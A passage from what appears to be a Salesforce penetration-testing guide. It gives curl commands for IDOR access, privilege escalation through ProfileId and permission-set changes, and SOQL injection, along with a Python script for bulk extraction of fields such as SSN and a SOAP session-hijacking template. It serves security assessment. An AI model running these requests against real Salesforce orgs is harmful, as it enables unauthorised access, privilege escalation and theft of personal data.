</span><span id="__span-52-13"><a id="__codelineno-52-13" name="__codelineno-52-13" href="#__codelineno-52-13"></a><span class="w">  </span>grep<span class="w"> </span>-oP<span class="w"> </span><span class="s1">&#39;(?&lt;=href=&quot;)[^&quot;]*&#39;</span>
</span></code></pre></div></p>
<p><strong>Authentication Security Testing</strong>:
<div class="language-bash highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="c1"># Test with invalid token</span>
</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>curl<span class="w"> </span>-i<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer invalid_token_12345&quot;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a><span class="w">  </span><span class="s2">&quot;https://instance.salesforce.com/services/data/v52.0/sobjects/&quot;</span>
</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a>
</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a><span class="c1"># Test with expired token</span>
</span><span id="__span-53-6"><a id="__codelineno-53-6" name="__codelineno-53-6" href="#__codelineno-53-6"></a>curl<span class="w"> </span>-i<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer expired_token&quot;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-53-7"><a id="__codelineno-53-7" name="__codelineno-53-7" href="#__codelineno-53-7"></a><span class="w">  </span><span class="s2">&quot;https://instance.salesforce.com/services/data/v52.0/sobjects/&quot;</span>
</span><span id="__span-53-8"><a id="__codelineno-53-8" name="__codelineno-53-8" href="#__codelineno-53-8"></a>
</span><span id="__span-53-9"><a id="__codelineno-53-9" name="__codelineno-53-9" href="#__codelineno-53-9"></a><span class="c1"># Test token reuse across different IPs</span>
</span><span id="__span-53-10"><a id="__codelineno-53-10" name="__codelineno-53-10" href="#__codelineno-53-10"></a>curl<span class="w"> </span>-i<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer </span><span class="nv">$VALID_TOKEN</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-53-11"><a id="__codelineno-53-11" name="__codelineno-53-11" href="#__codelineno-53-11"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;X-Forwarded-For: 192.168.1.100&quot;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-53-12"><a id="__codelineno-53-12" name="__codelineno-53-12" href="#__codelineno-53-12"></a><span class="w">  </span><span class="s2">&quot;https://instance.salesforce.com/services/data/v52.0/sobjects/&quot;</span>
</span></code></pre></div></p>
<p><strong>Authorization Bypass Testing</strong>:
<div class="language-bash highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="c1"># Test IDOR - access records owned by other users</span>
</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer </span><span class="nv">$USER_TOKEN</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a><span class="w">  </span><span class="s2">&quot;https://instance.salesforce.com/services/data/v52.0/sobjects/Account/001XX000003DHPt&quot;</span>
</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a>
</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a><span class="c1"># Test privilege escalation via API</span>
</span><span id="__span-54-6"><a id="__codelineno-54-6" name="__codelineno-54-6" href="#__codelineno-54-6"></a>curl<span class="w"> </span>-X<span class="w"> </span>PATCH<span class="w"> </span><span class="se">\</span>
</span><span id="__span-54-7"><a id="__codelineno-54-7" name="__codelineno-54-7" href="#__codelineno-54-7"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer </span><span class="nv">$USER_TOKEN</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-54-8"><a id="__codelineno-54-8" name="__codelineno-54-8" href="#__codelineno-54-8"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-54-9"><a id="__codelineno-54-9" name="__codelineno-54-9" href="#__codelineno-54-9"></a><span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;ProfileId&quot;:&quot;00eXX0000000001&quot;}&#39;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-54-10"><a id="__codelineno-54-10" name="__codelineno-54-10" href="#__codelineno-54-10"></a><span class="w">  </span><span class="s2">&quot;https://instance.salesforce.com/services/data/v52.0/sobjects/User/005XX000001b0Qw&quot;</span>
</span><span id="__span-54-11"><a id="__codelineno-54-11" name="__codelineno-54-11" href="#__codelineno-54-11"></a>
</span><span id="__span-54-12"><a id="__codelineno-54-12" name="__codelineno-54-12" href="#__codelineno-54-12"></a><span class="c1"># Test permission set assignment</span>
</span><span id="__span-54-13"><a id="__codelineno-54-13" name="__codelineno-54-13" href="#__codelineno-54-13"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
</span><span id="__span-54-14"><a id="__codelineno-54-14" name="__codelineno-54-14" href="#__codelineno-54-14"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer </span><span class="nv">$USER_TOKEN</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-54-15"><a id="__codelineno-54-15" name="__codelineno-54-15" href="#__codelineno-54-15"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-54-16"><a id="__codelineno-54-16" name="__codelineno-54-16" href="#__codelineno-54-16"></a><span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;PermissionSetId&quot;:&quot;0PS000000000001&quot;,&quot;AssigneeId&quot;:&quot;005XX000001b0Qw&quot;}&#39;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-54-17"><a id="__codelineno-54-17" name="__codelineno-54-17" href="#__codelineno-54-17"></a><span class="w">  </span><span class="s2">&quot;https://instance.salesforce.com/services/data/v52.0/sobjects/PermissionSetAssignment/&quot;</span>
</span></code></pre></div></p>
<p><strong>Injection Attack Testing</strong>:
<div class="language-bash highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="c1"># SOQL injection via query parameter</span>
</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>curl<span class="w"> </span>-G<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer </span><span class="nv">$TOKEN</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a><span class="w">  </span>--data-urlencode<span class="w"> </span><span class="s2">&quot;q=SELECT Id FROM Account WHERE Name = &#39;test&#39; UNION SELECT Id FROM User--&quot;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a><span class="w">  </span><span class="s2">&quot;https://instance.salesforce.com/services/data/v52.0/query/&quot;</span>
</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a>
</span><span id="__span-55-6"><a id="__codelineno-55-6" name="__codelineno-55-6" href="#__codelineno-55-6"></a><span class="c1"># Advanced data extraction attempt</span>
</span><span id="__span-55-7"><a id="__codelineno-55-7" name="__codelineno-55-7" href="#__codelineno-55-7"></a>curl<span class="w"> </span>-G<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer </span><span class="nv">$TOKEN</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-55-8"><a id="__codelineno-55-8" name="__codelineno-55-8" href="#__codelineno-55-8"></a><span class="w">  </span>--data-urlencode<span class="w"> </span><span class="s2">&quot;q=SELECT Id FROM Account WHERE Name = &#39;x&#39; OR (SELECT COUNT() FROM User WHERE Profile.Name = &#39;System Administrator&#39;) &gt; 0--&quot;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-55-9"><a id="__codelineno-55-9" name="__codelineno-55-9" href="#__codelineno-55-9"></a><span class="w">  </span><span class="s2">&quot;https://instance.salesforce.com/services/data/v52.0/query/&quot;</span>
</span><span id="__span-55-10"><a id="__codelineno-55-10" name="__codelineno-55-10" href="#__codelineno-55-10"></a>
</span><span id="__span-55-11"><a id="__codelineno-55-11" name="__codelineno-55-11" href="#__codelineno-55-11"></a><span class="c1"># SOSL injection testing</span>
</span><span id="__span-55-12"><a id="__codelineno-55-12" name="__codelineno-55-12" href="#__codelineno-55-12"></a>curl<span class="w"> </span>-G<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer </span><span class="nv">$TOKEN</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-55-13"><a id="__codelineno-55-13" name="__codelineno-55-13" href="#__codelineno-55-13"></a><span class="w">  </span>--data-urlencode<span class="w"> </span><span class="s2">&quot;q=FIND &#39;test&#39; RETURNING Account(Id), User(Id, Email, Profile.Name)&quot;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-55-14"><a id="__codelineno-55-14" name="__codelineno-55-14" href="#__codelineno-55-14"></a><span class="w">  </span><span class="s2">&quot;https://instance.salesforce.com/services/data/v52.0/search/&quot;</span>
</span></code></pre></div></p>
<p><strong>Impact</strong>: Unauthorized API access, data manipulation, privilege escalation.</p>
<h3 id="2-bulk-api-security-assessment">2. Bulk API Security Assessment</h3>
<p><strong>Objective</strong>: Test Bulk API for data exfiltration capabilities and security controls.</p>
<p><strong>Bulk API Data Extraction Testing</strong>:
<div class="language-python highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">xml.etree.ElementTree</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">ET</span>
</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>
</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a><span class="k">class</span><span class="w"> </span><span class="nc">BulkAPITester</span><span class="p">:</span>
</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a>    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">session_id</span><span class="p">,</span> <span class="n">instance_url</span><span class="p">):</span>
</span><span id="__span-56-6"><a id="__codelineno-56-6" name="__codelineno-56-6" href="#__codelineno-56-6"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">session_id</span> <span class="o">=</span> <span class="n">session_id</span>
</span><span id="__span-56-7"><a id="__codelineno-56-7" name="__codelineno-56-7" href="#__codelineno-56-7"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">instance_url</span> <span class="o">=</span> <span class="n">instance_url</span>
</span><span id="__span-56-8"><a id="__codelineno-56-8" name="__codelineno-56-8" href="#__codelineno-56-8"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">bulk_endpoint</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">instance_url</span><span class="si">}</span><span class="s2">/services/async/52.0&quot;</span>
</span><span id="__span-56-9"><a id="__codelineno-56-9" name="__codelineno-56-9" href="#__codelineno-56-9"></a>
</span><span id="__span-56-10"><a id="__codelineno-56-10" name="__codelineno-56-10" href="#__codelineno-56-10"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">create_bulk_job</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">sobject_type</span><span class="p">,</span> <span class="n">operation</span><span class="o">=</span><span class="s1">&#39;query&#39;</span><span class="p">):</span>
</span><span id="__span-56-11"><a id="__codelineno-56-11" name="__codelineno-56-11" href="#__codelineno-56-11"></a><span class="w">        </span><span class="sd">&quot;&quot;&quot;Create a bulk API job&quot;&quot;&quot;</span>
</span><span id="__span-56-12"><a id="__codelineno-56-12" name="__codelineno-56-12" href="#__codelineno-56-12"></a>        <span class="n">job_xml</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
</span><span id="__span-56-13"><a id="__codelineno-56-13" name="__codelineno-56-13" href="#__codelineno-56-13"></a><span class="s2">        &lt;jobInfo xmlns=&quot;http://www.force.com/2009/06/async/dataloader&quot;&gt;</span>
</span><span id="__span-56-14"><a id="__codelineno-56-14" name="__codelineno-56-14" href="#__codelineno-56-14"></a><span class="s2">            &lt;operation&gt;</span><span class="si">{</span><span class="n">operation</span><span class="si">}</span><span class="s2">&lt;/operation&gt;</span>
</span><span id="__span-56-15"><a id="__codelineno-56-15" name="__codelineno-56-15" href="#__codelineno-56-15"></a><span class="s2">            &lt;object&gt;</span><span class="si">{</span><span class="n">sobject_type</span><span class="si">}</span><span class="s2">&lt;/object&gt;</span>
</span><span id="__span-56-16"><a id="__codelineno-56-16" name="__codelineno-56-16" href="#__codelineno-56-16"></a><span class="s2">            &lt;contentType&gt;CSV&lt;/contentType&gt;</span>
</span><span id="__span-56-17"><a id="__codelineno-56-17" name="__codelineno-56-17" href="#__codelineno-56-17"></a><span class="s2">        &lt;/jobInfo&gt;&quot;&quot;&quot;</span>
</span><span id="__span-56-18"><a id="__codelineno-56-18" name="__codelineno-56-18" href="#__codelineno-56-18"></a>
</span><span id="__span-56-19"><a id="__codelineno-56-19" name="__codelineno-56-19" href="#__codelineno-56-19"></a>        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
</span><span id="__span-56-20"><a id="__codelineno-56-20" name="__codelineno-56-20" href="#__codelineno-56-20"></a>            <span class="s1">&#39;X-SFDC-Session&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">session_id</span><span class="p">,</span>
</span><span id="__span-56-21"><a id="__codelineno-56-21" name="__codelineno-56-21" href="#__codelineno-56-21"></a>            <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/xml&#39;</span>
</span><span id="__span-56-22"><a id="__codelineno-56-22" name="__codelineno-56-22" href="#__codelineno-56-22"></a>        <span class="p">}</span>
</span><span id="__span-56-23"><a id="__codelineno-56-23" name="__codelineno-56-23" href="#__codelineno-56-23"></a>
</span><span id="__span-56-24"><a id="__codelineno-56-24" name="__codelineno-56-24" href="#__codelineno-56-24"></a>        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span><span id="__span-56-25"><a id="__codelineno-56-25" name="__codelineno-56-25" href="#__codelineno-56-25"></a>            <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">bulk_endpoint</span><span class="si">}</span><span class="s2">/job&quot;</span><span class="p">,</span>
</span><span id="__span-56-26"><a id="__codelineno-56-26" name="__codelineno-56-26" href="#__codelineno-56-26"></a>            <span class="n">data</span><span class="o">=</span><span class="n">job_xml</span><span class="p">,</span>
</span><span id="__span-56-27"><a id="__codelineno-56-27" name="__codelineno-56-27" href="#__codelineno-56-27"></a>            <span class="n">headers</span><span class="o">=</span><span class="n">headers</span>
</span><span id="__span-56-28"><a id="__codelineno-56-28" name="__codelineno-56-28" href="#__codelineno-56-28"></a>        <span class="p">)</span>
</span><span id="__span-56-29"><a id="__codelineno-56-29" name="__codelineno-56-29" href="#__codelineno-56-29"></a>
</span><span id="__span-56-30"><a id="__codelineno-56-30" name="__codelineno-56-30" href="#__codelineno-56-30"></a>        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">201</span><span class="p">:</span>
</span><span id="__span-56-31"><a id="__codelineno-56-31" name="__codelineno-56-31" href="#__codelineno-56-31"></a>            <span class="n">root</span> <span class="o">=</span> <span class="n">ET</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
</span><span id="__span-56-32"><a id="__codelineno-56-32" name="__codelineno-56-32" href="#__codelineno-56-32"></a>            <span class="n">job_id</span> <span class="o">=</span> <span class="n">root</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;.//{http://www.force.com/2009/06/async/dataloader}id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span><span id="__span-56-33"><a id="__codelineno-56-33" name="__codelineno-56-33" href="#__codelineno-56-33"></a>            <span class="k">return</span> <span class="n">job_id</span>
</span><span id="__span-56-34"><a id="__codelineno-56-34" name="__codelineno-56-34" href="#__codelineno-56-34"></a>        <span class="k">else</span><span class="p">:</span>
</span><span id="__span-56-35"><a id="__codelineno-56-35" name="__codelineno-56-35" href="#__codelineno-56-35"></a>            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Job creation failed: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span id="__span-56-36"><a id="__codelineno-56-36" name="__codelineno-56-36" href="#__codelineno-56-36"></a>            <span class="k">return</span> <span class="kc">None</span>
</span><span id="__span-56-37"><a id="__codelineno-56-37" name="__codelineno-56-37" href="#__codelineno-56-37"></a>
</span><span id="__span-56-38"><a id="__codelineno-56-38" name="__codelineno-56-38" href="#__codelineno-56-38"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">add_batch</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">job_id</span><span class="p">,</span> <span class="n">query</span><span class="p">):</span>
</span><span id="__span-56-39"><a id="__codelineno-56-39" name="__codelineno-56-39" href="#__codelineno-56-39"></a><span class="w">        </span><span class="sd">&quot;&quot;&quot;Add batch to bulk job&quot;&quot;&quot;</span>
</span><span id="__span-56-40"><a id="__codelineno-56-40" name="__codelineno-56-40" href="#__codelineno-56-40"></a>        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
</span><span id="__span-56-41"><a id="__codelineno-56-41" name="__codelineno-56-41" href="#__codelineno-56-41"></a>            <span class="s1">&#39;X-SFDC-Session&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">session_id</span><span class="p">,</span>
</span><span id="__span-56-42"><a id="__codelineno-56-42" name="__codelineno-56-42" href="#__codelineno-56-42"></a>            <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;text/csv&#39;</span>
</span><span id="__span-56-43"><a id="__codelineno-56-43" name="__codelineno-56-43" href="#__codelineno-56-43"></a>        <span class="p">}</span>
</span><span id="__span-56-44"><a id="__codelineno-56-44" name="__codelineno-56-44" href="#__codelineno-56-44"></a>
</span><span id="__span-56-45"><a id="__codelineno-56-45" name="__codelineno-56-45" href="#__codelineno-56-45"></a>        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span><span id="__span-56-46"><a id="__codelineno-56-46" name="__codelineno-56-46" href="#__codelineno-56-46"></a>            <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">bulk_endpoint</span><span class="si">}</span><span class="s2">/job/</span><span class="si">{</span><span class="n">job_id</span><span class="si">}</span><span class="s2">/batch&quot;</span><span class="p">,</span>
</span><span id="__span-56-47"><a id="__codelineno-56-47" name="__codelineno-56-47" href="#__codelineno-56-47"></a>            <span class="n">data</span><span class="o">=</span><span class="n">query</span><span class="p">,</span>
</span><span id="__span-56-48"><a id="__codelineno-56-48" name="__codelineno-56-48" href="#__codelineno-56-48"></a>            <span class="n">headers</span><span class="o">=</span><span class="n">headers</span>
</span><span id="__span-56-49"><a id="__codelineno-56-49" name="__codelineno-56-49" href="#__codelineno-56-49"></a>        <span class="p">)</span>
</span><span id="__span-56-50"><a id="__codelineno-56-50" name="__codelineno-56-50" href="#__codelineno-56-50"></a>
</span><span id="__span-56-51"><a id="__codelineno-56-51" name="__codelineno-56-51" href="#__codelineno-56-51"></a>        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">201</span><span class="p">:</span>
</span><span id="__span-56-52"><a id="__codelineno-56-52" name="__codelineno-56-52" href="#__codelineno-56-52"></a>            <span class="n">root</span> <span class="o">=</span> <span class="n">ET</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
</span><span id="__span-56-53"><a id="__codelineno-56-53" name="__codelineno-56-53" href="#__codelineno-56-53"></a>            <span class="n">batch_id</span> <span class="o">=</span> <span class="n">root</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;.//{http://www.force.com/2009/06/async/dataloader}id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span><span id="__span-56-54"><a id="__codelineno-56-54" name="__codelineno-56-54" href="#__codelineno-56-54"></a>            <span class="k">return</span> <span class="n">batch_id</span>
</span><span id="__span-56-55"><a id="__codelineno-56-55" name="__codelineno-56-55" href="#__codelineno-56-55"></a>        <span class="k">else</span><span class="p">:</span>
</span><span id="__span-56-56"><a id="__codelineno-56-56" name="__codelineno-56-56" href="#__codelineno-56-56"></a>            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Batch creation failed: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span id="__span-56-57"><a id="__codelineno-56-57" name="__codelineno-56-57" href="#__codelineno-56-57"></a>            <span class="k">return</span> <span class="kc">None</span>
</span><span id="__span-56-58"><a id="__codelineno-56-58" name="__codelineno-56-58" href="#__codelineno-56-58"></a>
</span><span id="__span-56-59"><a id="__codelineno-56-59" name="__codelineno-56-59" href="#__codelineno-56-59"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">test_bulk_extraction</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">sobject_type</span><span class="p">,</span> <span class="n">sensitive_fields</span><span class="p">):</span>
</span><span id="__span-56-60"><a id="__codelineno-56-60" name="__codelineno-56-60" href="#__codelineno-56-60"></a><span class="w">        </span><span class="sd">&quot;&quot;&quot;Test bulk data extraction&quot;&quot;&quot;</span>
</span><span id="__span-56-61"><a id="__codelineno-56-61" name="__codelineno-56-61" href="#__codelineno-56-61"></a>        <span class="n">job_id</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_bulk_job</span><span class="p">(</span><span class="n">sobject_type</span><span class="p">)</span>
</span><span id="__span-56-62"><a id="__codelineno-56-62" name="__codelineno-56-62" href="#__codelineno-56-62"></a>        <span class="k">if</span> <span class="ow">not</span> <span class="n">job_id</span><span class="p">:</span>
</span><span id="__span-56-63"><a id="__codelineno-56-63" name="__codelineno-56-63" href="#__codelineno-56-63"></a>            <span class="k">return</span> <span class="kc">False</span>
</span><span id="__span-56-64"><a id="__codelineno-56-64" name="__codelineno-56-64" href="#__codelineno-56-64"></a>
</span><span id="__span-56-65"><a id="__codelineno-56-65" name="__codelineno-56-65" href="#__codelineno-56-65"></a>        <span class="n">query</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;SELECT Id, </span><span class="si">{</span><span class="s1">&#39;, &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">sensitive_fields</span><span class="p">)</span><span class="si">}</span><span class="s2"> FROM </span><span class="si">{</span><span class="n">sobject_type</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span id="__span-56-66"><a id="__codelineno-56-66" name="__codelineno-56-66" href="#__codelineno-56-66"></a>        <span class="n">batch_id</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">add_batch</span><span class="p">(</span><span class="n">job_id</span><span class="p">,</span> <span class="n">query</span><span class="p">)</span>
</span><span id="__span-56-67"><a id="__codelineno-56-67" name="__codelineno-56-67" href="#__codelineno-56-67"></a>
</span><span id="__span-56-68"><a id="__codelineno-56-68" name="__codelineno-56-68" href="#__codelineno-56-68"></a>        <span class="k">if</span> <span class="ow">not</span> <span class="n">batch_id</span><span class="p">:</span>
</span><span id="__span-56-69"><a id="__codelineno-56-69" name="__codelineno-56-69" href="#__codelineno-56-69"></a>            <span class="k">return</span> <span class="kc">False</span>
</span><span id="__span-56-70"><a id="__codelineno-56-70" name="__codelineno-56-70" href="#__codelineno-56-70"></a>
</span><span id="__span-56-71"><a id="__codelineno-56-71" name="__codelineno-56-71" href="#__codelineno-56-71"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Bulk extraction job created: </span><span class="si">{</span><span class="n">job_id</span><span class="si">}</span><span class="s2">, batch: </span><span class="si">{</span><span class="n">batch_id</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span id="__span-56-72"><a id="__codelineno-56-72" name="__codelineno-56-72" href="#__codelineno-56-72"></a>        <span class="k">return</span> <span class="kc">True</span>
</span><span id="__span-56-73"><a id="__codelineno-56-73" name="__codelineno-56-73" href="#__codelineno-56-73"></a>
</span><span id="__span-56-74"><a id="__codelineno-56-74" name="__codelineno-56-74" href="#__codelineno-56-74"></a><span class="c1"># Usage</span>
</span><span id="__span-56-75"><a id="__codelineno-56-75" name="__codelineno-56-75" href="#__codelineno-56-75"></a><span class="n">tester</span> <span class="o">=</span> <span class="n">BulkAPITester</span><span class="p">(</span><span class="n">session_id</span><span class="p">,</span> <span class="n">instance_url</span><span class="p">)</span>
</span><span id="__span-56-76"><a id="__codelineno-56-76" name="__codelineno-56-76" href="#__codelineno-56-76"></a><span class="n">sensitive_fields</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;Name&#39;</span><span class="p">,</span> <span class="s1">&#39;Email&#39;</span><span class="p">,</span> <span class="s1">&#39;Phone&#39;</span><span class="p">,</span> <span class="s1">&#39;SSN__c&#39;</span><span class="p">]</span>
</span><span id="__span-56-77"><a id="__codelineno-56-77" name="__codelineno-56-77" href="#__codelineno-56-77"></a><span class="n">tester</span><span class="o">.</span><span class="n">test_bulk_extraction</span><span class="p">(</span><span class="s1">&#39;Contact&#39;</span><span class="p">,</span> <span class="n">sensitive_fields</span><span class="p">)</span>
</span></code></pre></div></p>
<p><strong>Impact</strong>: Bulk data exfiltration capability assessment.</p>
<h3 id="3-soap-api-security-testing">3. SOAP API Security Testing</h3>
<p><strong>Objective</strong>: Assess SOAP API security including XML injection and session handling.</p>
<p><strong>SOAP Session Testing</strong>:
<div class="language-xml highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="cm">&lt;!-- Test session hijacking via SOAP --&gt;</span>
</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a><span class="nt">&lt;soapenv:Envelope</span><span class="w"> </span><span class="na">xmlns:soapenv=</span><span class="s">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span><span class="w"> </span>
</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a><span class="w">                  </span><span class="na">xmlns:urn=</span><span class="s">&quot;urn:enterprise.soap.sforce.com&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-57-4"><a id="__codelineno-57-4" name="__codelineno-57-4" href="#__codelineno-57-4"></a><span class="w">    </span><span class="nt">&lt;soapenv:Header&gt;</span>
</span><span id="__span-57-5"><a id="__codelineno-57-5" name="__codelineno-57-5" href="#__codelineno-57-5"></a><span class="w">        </span><span class="nt">&lt;urn:SessionHeader&gt;</span>
</span><span id="__span-57-6"><a id="__codelineno-57-6" name="__codelineno-57-6" href="#__codelineno-57-6"></a><span class="w">            </span><span class="nt">&lt;urn:sessionId&gt;</span>CAPTURED_SESSION_ID<span class="nt">&lt;/urn:sessionId&gt;</span>
</span><span id="__span-57-7"><a id="__codelineno-57-7" name="__codelineno-57-7" href="#__codelineno-57-7"></a><span class="w">        </span><span class="nt">&lt;/urn:SessionHeader&gt;</span>
</span><span id="__span-57-8"><a id="__codelineno-57-8" name="__codelineno-57-8" href="#__codelineno-57-8"></a><span class="w">    </span><span class="nt">&lt;/soapenv:Header&gt;</span>
</span><span id="__span-57-9"><a id="__codelineno-57-9" name="__codelineno-57-9" href="#__codelineno-57-9"></a><span class="w">    </span><span class="nt">&lt;soapenv:Body&gt;</span>
